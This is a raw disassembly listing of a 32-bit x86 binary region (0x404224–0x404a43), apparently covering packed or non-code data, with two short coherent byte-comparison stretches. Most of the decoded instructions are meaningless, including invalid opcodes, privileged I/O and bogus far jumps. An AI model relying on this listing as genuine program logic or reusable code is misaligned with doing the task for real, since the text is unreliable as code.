  404224:	out    dx,al
  404225:	dec    ebp
  404226:	dec    ebp
  404227:	(bad)  
  404228:	sti    
  404229:	pop    edx
  40422a:	scas   eax,DWORD PTR es:[edi]
  40422b:	clc    
  40422c:	jge    0x4041f5
  40422e:	(bad)  
  40422f:	dec    BYTE PTR [ebx+edi*1]
  404232:	cli    
  404233:	mov    ds:0x5e97ea73,al
  404238:	jb     0x4041de
  40423a:	inc    esp
  40423b:	mov    BYTE PTR [ecx],bh
  40423d:	push   eax
  40423e:	in     al,dx
  40423f:	dec    esi
  404240:	xchg   ebx,eax
  404241:	mov    eax,ds:0x8cadd3bf
  404246:	repz stc 
  404248:	xlat   BYTE PTR ds:[ebx]
  404249:	jnp    0x4041f1
  40424b:	or     al,0x8a
  40424d:	daa    
  40424e:	mov    esp,0x17d2eec2
  404253:	fldenv ds:0xe4d8b170
  404259:	pop    es
  40425a:	and    eax,0x630a4559
  40425f:	mov    dh,0x88
  404261:	push   ss
  404262:	iret   
  404263:	shr    BYTE PTR [edx],cl
  404265:	dec    ebx
  404266:	out    0xc8,eax
  404268:	out    0x6,al
  40426a:	cmp    eax,0x23453a11
  40426f:	std    
  404270:	mov    esp,0xb0719b1
  404275:	or     BYTE PTR [eax+ebx*4-0x38c04536],0xd8
  40427d:	cmp    eax,0xd3758ff5
  404282:	gs out dx,eax
  404284:	pop    ss
  404285:	inc    ebx
  404286:	repnz fwait
  404288:	and    ebp,DWORD PTR [esi+esi*4-0x1e]
  40428c:	add    BYTE PTR [eax+edx*1-0x73],ah
  404290:	mov    gs,WORD PTR [ebx-0x7ba25dfc]
  404296:	inc    ecx
  404297:	xor    al,0x7f
  404299:	cmp    BYTE PTR [ebp-0x26ab35bd],cl
  40429f:	mov    dh,0xc8
  4042a1:	rcl    BYTE PTR [edi],cl
  4042a3:	cmp    BYTE PTR [eax+ebp*2-0x35f1237a],ah
  4042aa:	sti    
  4042ab:	retf   
  4042ac:	mov    al,0xc8
  4042ae:	mov    dh,0x5
  4042b0:	mov    ds:0xb5ab24ce,al
  4042b5:	cdq    
  4042b6:	or     BYTE PTR [eax-0x43],bl
  4042b9:	fbld   TBYTE PTR [edx]
  4042bb:	and    bl,dl
  4042bd:	ins    DWORD PTR es:[edi],dx
  4042be:	pop    ebp
  4042bf:	clc    
  4042c0:	sbb    DWORD PTR ds:0x773e7621,esi
  4042c6:	xchg   esp,eax
  4042c7:	rol    dh,cl
  4042c9:	jae    0x4042d0
  4042cb:	pop    eax
  4042cc:	add    eax,0x1b2d930c
  4042d1:	arpl   WORD PTR [esi+edi*2],bx
  4042d4:	xchg   DWORD PTR [edx],ebx
  4042d6:	jmp    0x9f99:0x1af19dc2
  4042dd:	loop   0x404287
  4042df:	retf   0x54f4
  4042e2:	jge    0x40434c
  4042e4:	(bad)  
  4042e5:	rcl    DWORD PTR es:[esi],cl
  4042e8:	xchg   ebp,eax
  4042e9:	(bad)  
  4042ea:	cmc    
  4042eb:	rep outs dx,WORD PTR ds:[esi]
  4042ee:	cmp    eax,DWORD PTR [ebp-0x4e]
  4042f1:	test   DWORD PTR gs:[esi-0x28],esp
  4042f5:	jg     0x4042b6
  4042f7:	adc    al,0xcd
  4042f9:	push   ebp
  4042fa:	cli    
  4042fb:	adc    al,0x67
  4042fd:	pop    ebx
  4042fe:	cmp    eax,0x198d2cbb
  404303:	mov    ds:0xaff81108,al
  404308:	pop    eax
  404309:	jmp    FWORD PTR [esi]
  40430b:	jb     0x40429c
  40430d:	es sbb al,0xc0
  404310:	adc    ch,BYTE PTR [ecx+0x78ef430a]
  404316:	call   0xe2d8:0x2ea5cbd8
  40431d:	shl    DWORD PTR [eax-0x1a08bd03],0xef
  404324:	and    DWORD PTR [esi+0x5],edi
  404327:	inc    edi
  404328:	or     al,0x93
  40432a:	cs push edi
  40432c:	dec    edx
  40432d:	or     al,0x8e
  40432f:	push   eax
  404330:	out    dx,al
  404331:	(bad)  
  404332:	call   0x201beaab
  404337:	call   0x3f8908b9
  40433c:	popf   
  40433d:	aas    
  40433e:	push   ebp
  40433f:	adc    al,0x31
  404341:	mov    BYTE PTR [eax-0x54],ch
  404344:	test   DWORD PTR [ebp+0x5e2d383b],0x5ea840eb
  40434e:	add    BYTE PTR [ebx-0x59],0xab
  404352:	xor    al,0xbc
  404354:	enter  0xb199,0x31
  404358:	jne    0x40438e
  40435a:	jo     0x4043c7
  40435c:	jl     0x4043b3
  40435e:	and    DWORD PTR ss:[eax-0xf8ecae3],0xffffffa2
  404366:	in     al,dx
  404367:	out    dx,al
  404368:	rcr    BYTE PTR ds:0xc6de19dc,cl
  40436e:	jg     0x40436a
  404370:	mov    ch,0x1
  404372:	add    eax,0xaee5005d
  404377:	mov    DWORD PTR [ecx-0xefea760],0xa5fe250e
  404381:	dec    edi
  404382:	lea    edx,[ecx-0xb3618e8]
  404388:	je     0x40431f
  40438a:	mov    bl,0x66
  40438c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40438d:	or     esi,0x7b
  404390:	mov    bl,0x72
  404392:	fst    QWORD PTR [ecx+esi*4-0x63b0b814]
  404399:	xor    dl,bh
  40439b:	mov    al,0x71
  40439d:	ja     0x404339
  40439f:	mov    bl,0x30
  4043a1:	push   ebp
  4043a2:	or     edi,ebp
  4043a4:	clc    
  4043a5:	push   cs
  4043a6:	jae    0x40440f
  4043a8:	popa   
  4043a9:	xchg   esp,eax
  4043aa:	mov    ebp,0xc466909d
  4043af:	jno    0x4043eb
  4043b1:	pop    ecx
  4043b2:	pop    ecx
  4043b3:	add    DWORD PTR ds:0x3e2ef927,ebx
  4043b9:	xor    DWORD PTR [ecx+0x74],esi
  4043bc:	mov    edi,0x61c04839
  4043c1:	mov    WORD PTR [ebx-0x611edfc5],fs
  4043c7:	inc    esi
  4043c8:	jg     0x4043b2
  4043ca:	fbld   TBYTE PTR [eax]
  4043cc:	test   al,0x91
  4043ce:	enter  0xa500,0x9b
  4043d2:	pop    edx
  4043d3:	(bad)  
  4043d4:	cwde   
  4043d5:	out    0xb,eax
  4043d7:	mov    ds:0xa7279d3,eax
  4043dc:	jmp    0xe1ee:0x8aa6d860
  4043e3:	or     DWORD PTR [eax-0x556ed050],eax
  4043e9:	mov    eax,ds:0xabde84e1
  4043ee:	mov    ch,0xcb
  4043f0:	out    0xf4,eax
  4043f2:	loop   0x4043a2
  4043f4:	shr    DWORD PTR [edi],cl
  4043f6:	xor    ebp,DWORD PTR fs:[esi+0x6316b2bd]
  4043fd:	sub    DWORD PTR [ebp+0x476d3b05],esi
  404403:	mov    bh,0xb2
  404405:	push   eax
  404406:	sbb    al,0x17
  404408:	cs icebp 
  40440a:	cdq    
  40440b:	bound  ecx,QWORD PTR [ecx-0x617c8a75]
  404411:	(bad)  
  404412:	pop    ebx
  404413:	pusha  
  404414:	fisub  DWORD PTR [edx+0x753a9c5c]
  40441a:	xchg   edx,eax
  40441b:	test   DWORD PTR [edx+0x77],edx
  40441e:	cmp    bh,BYTE PTR [edx]
  404420:	cmc    
  404421:	ror    DWORD PTR [edx+0x25],cl
  404424:	scas   al,BYTE PTR es:[edi]
  404425:	out    dx,eax
  404426:	and    esi,DWORD PTR [esi-0x4ab65710]
  40442c:	and    eax,DWORD PTR ds:[esp+ebx*2]
  404430:	mov    edx,0x6d20a6b1
  404435:	rcl    al,cl
  404437:	mov    al,ds:0xd1fc6d0f
  40443c:	test   DWORD PTR [eax],ebp
  40443e:	sar    BYTE PTR [edx],0xcd
  404441:	(bad)  
  404442:	hlt    
  404443:	push   eax
  404444:	jp     0x404404
  404446:	test   DWORD PTR [ebx-0xb],edi
  404449:	jne    0x404411
  40444b:	jle    0x4043dd
  40444d:	sar    BYTE PTR [ecx],cl
  40444f:	nop    DWORD PTR ds:0xe3d681e2
  404456:	test   DWORD PTR [edi-0x20],esp
  404459:	mov    dh,0xb1
  40445b:	mov    ds:0x7f43806e,al
  404460:	inc    esp
  404461:	mov    bh,ah
  404463:	or     al,0xac
  404465:	cmp    DWORD PTR [ecx+0x6d],esi
  404468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404469:	dec    ecx
  40446a:	xchg   esp,eax
  40446b:	int3   
  40446c:	in     al,dx
  40446d:	adc    bh,BYTE PTR ds:0x93616da1
  404473:	inc    edx
  404474:	xchg   esi,eax
  404475:	inc    edx
  404476:	and    esp,0x45
  404479:	iret   
  40447a:	into   
  40447b:	push   0xf9775537
  404480:	mov    edi,0xa4c17ba
  404485:	bound  edi,QWORD PTR [ebp-0x46ca30e5]
  40448b:	stc    
  40448c:	fild   DWORD PTR [eax+0x1ff802ae]
  404492:	fld    st(6)
  404494:	and    BYTE PTR [ecx],bl
  404496:	and    ah,BYTE PTR [eax-0x6]
  404499:	pop    ss
  40449a:	jl     0x4044fc
  40449c:	and    edx,DWORD PTR [ebx+0x4a553945]
  4044a2:	ds jae 0x40449d
  4044a5:	add    eax,0x642d29e2
  4044aa:	ins    BYTE PTR es:[edi],dx
  4044ab:	inc    esi
  4044ac:	das    
  4044ad:	mov    al,0x2f
  4044af:	add    edi,DWORD PTR [ebp+esi*4-0x26faeeee]
  4044b6:	rep stos BYTE PTR es:[edi],al
  4044b8:	add    bl,BYTE PTR [edx+0x7]
  4044bb:	std    
  4044bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044bd:	pop    DWORD PTR [esi+0x15]
  4044c0:	sbb    DWORD PTR [esi+0x55b1df5b],0x6d89c6d9
  4044ca:	shl    bl,0xe2
  4044cd:	and    ebx,DWORD PTR [ebp-0x5b]
  4044d0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044d4:	mov    dl,BYTE PTR [ebp-0x1]
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	pop    eax
  40450c:	push   eax
  40450d:	cdq    
  40450e:	jmp    0x7ebe6cfe
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404528
  404518:	adc    BYTE PTR ds:0x4184e44c,bl
  40451e:	int3   
  40451f:	lock push edx
  404521:	pop    es
  404522:	mov    bh,al
  404524:	aam    0xa6
  404526:	fsubr  DWORD PTR [eax]
  404528:	pusha  
  404529:	(bad)  
  40452a:	stos   DWORD PTR es:[edi],eax
  40452b:	test   al,0xa3
  40452d:	(bad)  
  40452e:	sub    edx,DWORD PTR [edi]
  404530:	ror    BYTE PTR [edx+0x7eb2e7ce],cl
  404536:	bound  ebp,QWORD PTR [edx+0x3d]
  404539:	out    dx,eax
  40453a:	adc    DWORD PTR [eax-0x56],esp
  40453d:	gs push eax
  40453f:	loope  0x4044d7
  404541:	mov    BYTE PTR [ebp-0x42a6255a],ch
  404547:	or     ebp,DWORD PTR [ebx-0x3b034ea2]
  40454d:	mov    dl,0x72
  40454f:	outs   dx,BYTE PTR ds:[esi]
  404550:	scas   al,BYTE PTR es:[edi]
  404551:	sub    al,0xb
  404553:	int    0xe4
  404555:	cmp    dl,BYTE PTR [esi]
  404557:	push   0xffffffb6
  404559:	cmp    bl,cl
  40455b:	call   0x151c5be
  404560:	mov    dl,0xab
  404562:	out    dx,al
  404563:	and    ebp,DWORD PTR [ecx]
  404565:	dec    edx
  404566:	in     al,0xda
  404568:	cld    
  404569:	addr16 mov ah,0xea
  40456c:	sub    DWORD PTR [ecx+0x31afe429],edx
  404572:	in     eax,0x3f
  404574:	repz sub al,0x7e
  404577:	out    0xb,eax
  404579:	and    ebp,DWORD PTR [ebp+0x65]
  40457c:	sbb    BYTE PTR [esp+esi*1+0x75],dh
  404580:	adc    bh,dl
  404582:	fisubr DWORD PTR [eax+0x67effdfb]
  404588:	and    eax,0x43abdc80
  40458d:	jne    0x404567
  40458f:	add    al,0xd5
  404591:	cmp    dh,BYTE PTR [ecx+0x7c]
  404594:	loopne 0x40452b
  404596:	cld    
  404597:	sahf   
  404598:	test   cl,dl
  40459a:	mov    bh,cl
  40459c:	dec    esi
  40459d:	adc    al,0xfd
  40459f:	add    ebx,ecx
  4045a1:	ds nop
  4045a3:	pusha  
  4045a4:	sub    BYTE PTR [esi+0x61],dh
  4045a7:	inc    ebp
  4045a8:	pop    ecx
  4045a9:	mov    al,0xe9
  4045ab:	fidivr DWORD PTR [edx-0x18e30a81]
  4045b1:	outs   dx,BYTE PTR ds:[esi]
  4045b2:	jl     0x404548
  4045b4:	fsub   st,st(7)
  4045b6:	and    BYTE PTR [edx+0x5cbe5f2],al
  4045bc:	popf   
  4045bd:	lods   al,BYTE PTR ds:[esi]
  4045be:	mov    fs,WORD PTR [ebx+0x15b66e36]
  4045c4:	fs jo  0x404588
  4045c7:	push   esi
  4045c8:	push   eax
  4045c9:	out    dx,eax
  4045ca:	fwait
  4045cb:	or     eax,0xe01276a5
  4045d0:	in     eax,dx
  4045d1:	(bad)  [esi]
  4045d3:	xchg   DWORD PTR [edx+0x4b],eax
  4045d6:	aas    
  4045d7:	push   ss
  4045d8:	in     al,0x62
  4045da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045db:	lahf   
  4045dc:	sar    bl,1
  4045de:	dec    esp
  4045df:	idiv   ebx
  4045e1:	out    0xdf,eax
  4045e3:	push   ebp
  4045e4:	mov    esp,0x1d84c265
  4045e9:	ja     0x404573
  4045eb:	xchg   DWORD PTR [eax],eax
  4045ed:	jmp    0xabd8:0x27950760
  4045f4:	dec    ecx
  4045f5:	pop    es
  4045f6:	in     al,dx
  4045f7:	clc    
  4045f8:	data16 in al,0xe7
  4045fb:	stos   DWORD PTR es:[edi],eax
  4045fc:	imul   eax,DWORD PTR [ecx],0x41e07a53
  404602:	sub    BYTE PTR [edx+esi*2],bh
  404605:	mov    ds:0x9e1e45a,al
  40460a:	add    al,0xb1
  40460c:	xchg   ecx,eax
  40460d:	mov    edi,DWORD PTR [edi]
  40460f:	xchg   ecx,eax
  404610:	cmp    al,0x65
  404612:	fistp  WORD PTR [esi+0x25]
  404615:	in     eax,dx
  404616:	pop    ebp
  404617:	and    BYTE PTR [esi],bh
  404619:	div    esp
  40461b:	inc    esi
  40461c:	push   0xffffff92
  40461e:	mov    bl,0xfb
  404620:	and    eax,0x6373ad20
  404625:	push   ss
  404626:	inc    edx
  404627:	sysret 
  404629:	popa   
  40462a:	jae    0x40469b
  40462c:	mov    ebx,0x3ecc09bc
  404631:	pop    esp
  404632:	rol    BYTE PTR [ebx+0x79e6c55a],1
  404638:	pop    ebp
  404639:	add    ah,BYTE PTR [edx]
  40463b:	jg     0x404686
  40463d:	fnstcw WORD PTR [ebp+0x7]
  404640:	cmp    DWORD PTR [esi],ebp
  404642:	loope  0x40463d
  404644:	jb     0x4046ac
  404646:	bound  ecx,QWORD PTR [ecx+0x1a2e5265]
  40464c:	stc    
  40464d:	mov    eax,0x93d54389
  404652:	hlt    
  404653:	cmp    al,0x42
  404655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404656:	not    bh
  404658:	into   
  404659:	aaa    
  40465a:	imul   bl
  40465c:	sar    DWORD PTR [edi],0x5e
  40465f:	daa    
  404660:	mov    bh,0xfb
  404662:	shl    DWORD PTR [edi+ebx*8+0x5a],cl
  404666:	outs   dx,DWORD PTR ds:[esi]
  404667:	dec    esi
  404668:	xchg   DWORD PTR [esi],edx
  40466a:	pop    esp
  40466b:	mov    cl,0xf1
  40466d:	sbb    eax,0x33219286
  404672:	sbb    eax,0xa237e92a
  404677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404678:	jae    0x4046da
  40467a:	mov    eax,DWORD PTR [esi-0x2f29dfc1]
  404680:	repnz daa 
  404682:	xchg   esp,eax
  404683:	cli    
  404684:	(bad)  
  404685:	push   ecx
  404686:	push   es
  404687:	into   
  404688:	test   al,0xe5
  40468a:	jmp    0x4046e1
  40468c:	iret   
  40468d:	imul   ah
  40468f:	(bad)  
  404690:	enter  0x9feb,0x9e
  404694:	hlt    
  404695:	int    0x9b
  404697:	enter  0x5164,0xfd
  40469b:	pop    ebp
  40469c:	xchg   DWORD PTR [ebp+0x1a6df069],ebp
  4046a2:	ret    
  4046a3:	pop    ds
  4046a4:	imul   ebp,ecx,0x593d6ee3
  4046aa:	mov    edi,0xaa5f0bb1
  4046af:	addr16 push 0x395c345
  4046b5:	push   esi
  4046b6:	mov    dl,0x1a
  4046b8:	popf   
  4046b9:	xchg   edx,eax
  4046ba:	mov    ecx,eax
  4046bc:	xchg   esi,eax
  4046bd:	push   0xfba490a8
  4046c2:	adc    eax,DWORD PTR [esi+ecx*4]
  4046c5:	aas    
  4046c6:	mov    esi,0x866e004
  4046cb:	call   0x87ab:0x8fa46a80
  4046d2:	pop    edx
  4046d3:	pop    esi
  4046d4:	stc    
  4046d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d6:	xchg   ecx,eax
  4046d7:	mov    ds:0x45186e7e,eax
  4046dc:	pop    edi
  4046dd:	cli    
  4046de:	adc    eax,0xde4e985a
  4046e3:	xchg   ecx,eax
  4046e4:	jne    0x404723
  4046e6:	(bad)  
  4046e7:	pop    ebx
  4046e8:	add    dl,BYTE PTR [esi-0x1e939e4d]
  4046ee:	sub    ecx,edx
  4046f0:	cmp    al,0xa6
  4046f2:	je     0x40467e
  4046f4:	in     eax,0x1c
  4046f6:	ins    DWORD PTR es:[edi],dx
  4046f7:	fdiv   QWORD PTR [ebx]
  4046f9:	add    eax,0x6d614394
  4046fe:	adc    BYTE PTR [eax-0x4d000120],cl
  404704:	sti    
  404705:	fld    DWORD PTR [edi+0x3f796ee8]
  40470b:	dec    edx
  40470c:	ds and al,0xe
  40470f:	jg     0x40470f
  404711:	(bad)  
  404712:	jmp    0x65376117
  404717:	xor    al,0x11
  404719:	bound  ebp,QWORD PTR ds:0xe8249850
  40471f:	test   DWORD PTR [edx],eax
  404721:	jbe    0x4046ca
  404723:	out    0x22,al
  404725:	cmp    BYTE PTR [ebp+0x5ec47e9b],al
  40472b:	cmp    DWORD PTR [esi],edx
  40472d:	bound  ecx,QWORD PTR [eax+0x2aec747f]
  404733:	clc    
  404734:	adc    cl,BYTE PTR [ebx+0x276bdcb]
  40473a:	ds xchg edx,eax
  40473c:	test   esi,edi
  40473e:	mov    DWORD PTR [eax-0x42],edi
  404741:	int3   
  404742:	jbe    0x404706
  404744:	(bad)  
  404746:	or     DWORD PTR cs:[ebp+0x37],edi
  40474a:	sub    esp,DWORD PTR [eax]
  40474c:	nop
  40474d:	mul    BYTE PTR [edx]
  40474f:	ds xchg ecx,eax
  404751:	clc    
  404752:	(bad)  
  404753:	pusha  
  404754:	fwait
  404755:	les    edi,FWORD PTR [ecx]
  404757:	sbb    al,0x97
  404759:	mov    al,ds:0x9627b966
  40475e:	and    eax,0x332348ba
  404763:	cmp    BYTE PTR [esi-0x4c],cl
  404766:	in     al,0x75
  404768:	xor    al,0x11
  40476a:	cmp    ecx,DWORD PTR [ecx]
  40476c:	repz out dx,eax
  40476e:	sbb    al,cl
  404770:	sbb    eax,0x9c7f03fd
  404775:	call   0xd542:0x82b1259c
  40477c:	cmp    BYTE PTR [edx+0x6b8453e8],dl
  404782:	mov    cl,0x8b
  404784:	lock push edx
  404786:	fistp  DWORD PTR [eax+ebx*4]
  404789:	jbe    0x4047f7
  40478b:	inc    esi
  40478c:	ficom  WORD PTR [ebx+0x3080495]
  404792:	retf   0xaad8
  404795:	arpl   WORD PTR [edi+0x2d],bx
  404798:	scas   eax,DWORD PTR es:[edi]
  404799:	mov    ebx,0x807b7967
  40479e:	pop    edi
  40479f:	add    eax,0xae5f43a4
  4047a4:	push   eax
  4047a5:	fisub  DWORD PTR ds:0xbbc2b614
  4047ab:	lds    edx,FWORD PTR [ebp+0x76c4cb34]
  4047b1:	sbb    al,BYTE PTR [eax-0x594ff1ed]
  4047b7:	pop    edx
  4047b8:	cmp    eax,0xff0169ad
  4047bd:	sub    al,0x7e
  4047bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047c0:	add    DWORD PTR [edx+0x18a338f6],0xffffff84
  4047c7:	add    bl,al
  4047c9:	fbstp  TBYTE PTR [edi+0x50]
  4047cc:	in     al,0x15
  4047ce:	test   al,0xbe
  4047d0:	xor    ebx,DWORD PTR [esi+0x67]
  4047d3:	popf   
  4047d4:	je     0x404765
  4047d6:	mov    edi,0x6bd1b14d
  4047db:	enter  0x9230,0xa8
  4047df:	pop    esp
  4047e0:	push   ds
  4047e1:	or     al,0x36
  4047e3:	xor    bh,BYTE PTR [edi-0x79a9a96]
  4047e9:	push   edi
  4047ea:	pushf  
  4047eb:	or     BYTE PTR [edi+0x51],cl
  4047ee:	scas   al,BYTE PTR es:[edi]
  4047ef:	sbb    bh,cl
  4047f1:	loope  0x40477f
  4047f3:	push   cs
  4047f4:	loope  0x40483c
  4047f6:	fs push ecx
  4047f8:	cmp    esp,esi
  4047fa:	xchg   ebp,eax
  4047fb:	and    dh,ah
  4047fd:	mov    esp,0x4fde2707
  404802:	cmp    esi,0xffffffaa
  404805:	and    BYTE PTR [eax],ch
  404807:	mov    cl,0xd6
  404809:	stos   DWORD PTR es:[edi],eax
  40480a:	jne    0x4047fb
  40480c:	lahf   
  40480d:	scas   eax,DWORD PTR es:[edi]
  40480e:	iret   
  40480f:	dec    ebp
  404810:	sahf   
  404811:	inc    esi
  404812:	mov    cs,edi
  404814:	add    eax,0xe823248f
  404819:	pop    ebp
  40481a:	hlt    
  40481b:	push   ebp
  40481c:	mov    bh,BYTE PTR [eax+ecx*8]
  40481f:	xchg   DWORD PTR [ecx],ebx
  404821:	mul    ah
  404823:	and    BYTE PTR [esp+ebx*2-0x4c8bafc4],dl
  40482a:	mov    cl,0x86
  40482c:	dec    esi
  40482d:	outs   dx,BYTE PTR ds:[esi]
  40482e:	jmp    0xf5e7:0x1da9739d
  404835:	inc    edi
  404836:	sub    edx,esi
  404838:	and    ebx,DWORD PTR [eax+0x5bba39ec]
  40483e:	mov    eax,0x72430609
  404843:	adc    al,0xa4
  404845:	mov    ah,0x3
  404848:	ins    BYTE PTR es:[edi],dx
  404849:	ins    DWORD PTR es:[edi],dx
  40484a:	xor    eax,0x606c7626
  40484f:	enter  0x2755,0x8d
  404853:	or     BYTE PTR [edi-0x20d6fd60],bl
  404859:	jmp    0x99611574
  40485e:	push   edx
  40485f:	pop    ebp
  404860:	les    edi,FWORD PTR [eax]
  404862:	xor    ebp,0xffffff84
  404865:	mov    ds:0xedb489e0,eax
  40486a:	pop    es
  40486b:	pop    eax
  40486c:	out    dx,al
  40486d:	jmp    0xdc322ad4
  404872:	out    dx,eax
  404873:	sub    ch,dl
  404875:	and    DWORD PTR [edi+0x50],ebp
  404878:	dec    esp
  404879:	sar    DWORD PTR [ebp+ecx*1-0x62379092],cl
  404880:	pop    ss
  404881:	xor    al,0x20
  404883:	push   ds
  404884:	neg    BYTE PTR [ebp+0x5b]
  404887:	and    eax,0xfd55a895
  40488c:	add    eax,0x1d8132
  404891:	sti    
  404892:	inc    eax
  404893:	mov    al,0x30
  404895:	cwde   
  404896:	and    al,BYTE PTR [ebp-0x48]
  404899:	inc    edi
  40489a:	enter  0xb80c,0x80
  40489e:	inc    eax
  40489f:	adc    bh,0xda
  4048a2:	lahf   
  4048a3:	mov    eax,0xcba7e632
  4048a8:	scas   al,BYTE PTR es:[edi]
  4048a9:	mov    al,ds:0xd593cd8b
  4048ae:	pop    es
  4048af:	lds    ebp,FWORD PTR [edx+0x6e]
  4048b2:	mov    edx,0x86c61ff2
  4048b7:	lds    eax,FWORD PTR [edi+edi*4+0xe4e6004]
  4048be:	loope  0x4048ea
  4048c0:	loope  0x40484a
  4048c2:	test   DWORD PTR [ecx+0x3f5f24e9],ebx
  4048c8:	xlat   BYTE PTR ds:[ebx]
  4048c9:	cwde   
  4048ca:	retf   0x61d6
  4048cd:	cs (bad) 
  4048cf:	clc    
  4048d0:	dec    edi
  4048d1:	mov    esp,0x8e1bd302
  4048d6:	jecxz  0x4048e6
  4048d8:	sbb    ecx,ecx
  4048da:	popf   
  4048db:	jge    0x404948
  4048dd:	mov    ah,0x16
  4048df:	xchg   esp,eax
  4048e0:	pop    ss
  4048e1:	jno    0x4048f0
  4048e3:	lock mov ecx,0x86facf57
  4048e9:	or     bh,BYTE PTR [ebp+0x38f64ae5]
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	xor    al,0x8
  40491b:	mov    al,0xf8
  40491d:	ret    
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x4048eb
  404926:	sub    ebx,ebp
  404928:	(bad)  
  40492a:	or     dh,0x46
  40492d:	mov    al,ds:0xc8029a71
  404932:	and    DWORD PTR [esi],ebp
  404934:	hlt    
  404935:	push   ds
  404936:	lock dec esi
  404938:	aad    0x7f
  40493a:	pop    edi
  40493b:	imul   esi,DWORD PTR ds:[ecx-0x26],0xffffffc0
  404940:	pop    eax
  404941:	(bad)  
  404942:	fsubr  st(4),st
  404944:	repnz popf 
  404946:	stos   BYTE PTR es:[edi],al
  404947:	mov    dh,0xca
  404949:	mov    bh,0xb7
  40494b:	fnstcw WORD PTR [ecx+edx*8-0x74610f12]
  404952:	or     al,0x55
  404954:	adc    esi,0x3900ac68
  40495a:	imul   edi,DWORD PTR [eax],0xffffff9b
  40495d:	xor    cl,BYTE PTR [eax-0x7c]
  404960:	shl    DWORD PTR [eax-0x47bfb93e],1
  404966:	test   eax,0x86f27325
  40496b:	push   edi
  40496c:	aaa    
  40496d:	sub    al,0xe4
  404970:	jb     0x404991
  404972:	fist   DWORD PTR [edi+0x77b502f]
  404978:	xchg   DWORD PTR [edi+eiz*2],esp
  40497b:	jbe    0x4049c3
  40497d:	dec    esi
  40497e:	sub    al,0x29
  404980:	in     eax,dx
  404981:	xor    ecx,DWORD PTR [ebx]
  404983:	cmp    eax,0x53b8580
  404988:	jmp    0x8a95:0xd8dab102
  40498f:	jne    0x404a06
  404991:	cmp    al,0x70
  404993:	jne    0x404997
  404995:	ins    DWORD PTR es:[edi],dx
  404996:	mov    WORD PTR [eax-0x1b],ss
  404999:	aas    
  40499a:	jae    0x40493e
  40499c:	sub    eax,0x5d40d9d
  4049a1:	cmp    dh,BYTE PTR [ebp-0x7e]
  4049a4:	bound  ebp,QWORD PTR [edi-0x47]
  4049a7:	and    BYTE PTR ds:0x770e6911,0x98
  4049ae:	xchg   ebp,eax
  4049af:	push   cs
  4049b0:	cli    
  4049b1:	mov    ?,ebx
  4049b3:	xchg   ebp,eax
  4049b4:	jbe    0x404973
  4049b6:	retf   0x2ca4
  4049b9:	pop    ds
  4049ba:	in     eax,0x9
  4049bc:	xor    ah,bl
  4049be:	pop    ds
  4049bf:	sbb    al,0x48
  4049c1:	lea    ecx,[ebp-0x60a6d033]
  4049c7:	cwde   
  4049c8:	(bad)  
  4049c9:	(bad)
  4049ce:	imul   eax,DWORD PTR [esi+0x15],0x30
  4049d2:	repnz xor edi,eax
  4049d5:	fcmovb st,st(6)
  4049d7:	dec    ebx
  4049d8:	scas   al,BYTE PTR es:[edi]
  4049d9:	adc    ebx,esp
  4049db:	test   BYTE PTR [esi-0x32],0xfc
  4049df:	push   ebp
  4049e0:	mov    edi,0x8f2d9363
  4049e5:	ins    BYTE PTR es:[edi],dx
  4049e6:	jo     0x4049da
  4049e8:	enter  0x452f,0x3e
  4049ec:	(bad)  
  4049ed:	dec    esi
  4049ee:	loope  0x404a3d
  4049f0:	loopne 0x404a71
  4049f2:	adc    bl,dl
  4049f4:	dec    esp
  4049f5:	or     esi,eax
  4049f7:	rcl    DWORD PTR [ebx],0x12
  4049fa:	dec    sp
  4049fc:	aaa    
  4049fd:	push   edi
  4049fe:	push   0x17
  404a00:	mov    dl,BYTE PTR [ebx-0x59fe33f7]
  404a06:	clc    
  404a07:	or     edx,DWORD PTR [ebx-0x32ace6b6]
  404a0d:	pop    edi
  404a0e:	mov    ebp,0x7df317e4
  404a13:	jle    0x404a29
  404a15:	repz or dh,BYTE PTR ds:0xdff81ecf
  404a1c:	(bad)  
  404a1d:	test   eax,0xe15f88a5
  404a22:	std    
  404a23:	in     al,dx
  404a24:	or     cl,al
  404a26:	push   cs
  404a27:	shr    BYTE PTR [esi],1
  404a29:	inc    esi
  404a2a:	add    bh,ch
  404a2c:	add    al,0xcc
  404a2e:	dec    eax
  404a2f:	aaa    
  404a30:	dec    ebp
  404a31:	jo     0x404a7c
  404a33:	mov    ecx,0x1491ae34
  404a38:	iret   
  404a39:	aad    0x1e
  404a3b:	out    dx,al
  404a3c:	ins    BYTE PTR es:[edi],dx
  404a3d:	repz cmp bl,BYTE PTR [ebp-0x45]
  404a41:	xchg   ebx,eax
  404a42:	leave  
  404a43:	mov    es,ebp
